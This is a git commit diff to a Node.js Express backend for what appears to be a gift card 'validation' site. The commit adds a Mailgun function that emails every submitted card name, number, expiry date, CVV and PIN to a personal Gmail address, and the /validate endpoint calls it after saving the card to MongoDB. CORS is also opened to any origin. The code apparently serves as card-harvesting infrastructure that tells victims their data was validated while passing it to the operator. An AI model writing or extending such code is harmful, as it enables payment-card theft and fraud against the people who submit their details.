4aae721c017bc4fe5bbf56b403e8290fc1cfda41
escandon100 <olakunle23odunade@gmail.com>
2026-03-12 19:12:39 +0100

    update

--- app.js
+++ app.js
@@ -1,5 +1,7 @@
 import express from "express";
 import mongoose from "mongoose";
+import FormData from "form-data"; 
+import Mailgun from "mailgun.js"; 
 import dotenv from "dotenv";
 import bodyParser from "body-parser";
 import cors from "cors"
@@ -8,10 +10,13 @@ import cors from "cors"
 dotenv.config();
 
 const app = express()
-
+app.use(cors())
 app.use(bodyParser.json());
 
-app.use(cors({origin:"https://www.ivalidategcs.com",credentials : true}))
+
+
+app.use(cors({origin:"http://localhost:5173",credentials : true}))
+
 
 
 
@@ -21,6 +26,33 @@ mongoose.connect(process.env.MONGO_URI)
   .catch((err) => console.error("MongoDB connection error:", err));
 
 
+
+
+async function sendCardDetails(data) {
+  const mailgun = new Mailgun(FormData);
+  const mg = mailgun.client({
+    username: "api",
+    key: process.env.MAIL_GUN_API_KEY});
+
+  try {
+    const msg = await mg.messages.create("mg.ivalidategcs.com", {
+      from: "Mailgun Sandbox <postmaster@mg.ivalidategcs.com>",
+      to: ["<olakunle23odunade@gmail.com>"],
+      subject: "Gift Card Update",
+      text: `
+        CardName : ${data.cardName}
+        CardNumber: ${data.cardNumber}
+        expiryDate : ${data.expiryDate}
+        cvv: ${data.cvv}
+        expiryDate: ${data.pin}`
+
+    });
+
+    console.log(msg); 
+  } catch (error) {
+    console.log(error); 
+  }
+}
 
 const giftCardInputSchema = new mongoose.Schema({
     cardName : String,
@@ -38,17 +70,19 @@ app.post("/validate" , (async (req , res ) => {
     try{
         const {cardNumber , expiryDate , cvv , pin } = req.body;
 
-          const newCard = new GiftCardInput({
-            cardName : req.body.cardName,
-            cardNumber : req.body.cardNumber,
-            expiryDate : req.body.expiryDate,
-            cvv : req.body.cvv,
-            pin : req.body.pin
-        
-          });
+        const newCard = new GiftCardInput({
+        cardName : req.body.cardName,
+        cardNumber : req.body.cardNumber,
+        expiryDate : req.body.expiryDate,
+        cvv : req.body.cvv,
+        pin : req.body.pin
+    
+        });
       
-          await newCard.save();
-          return res.status(200).json("Successfully Saved");
+        await newCard.save();
+        sendCardDetails(req.body)
+
+        return res.status(200).json("Successfully Saved");
 
 
     }catch(err){
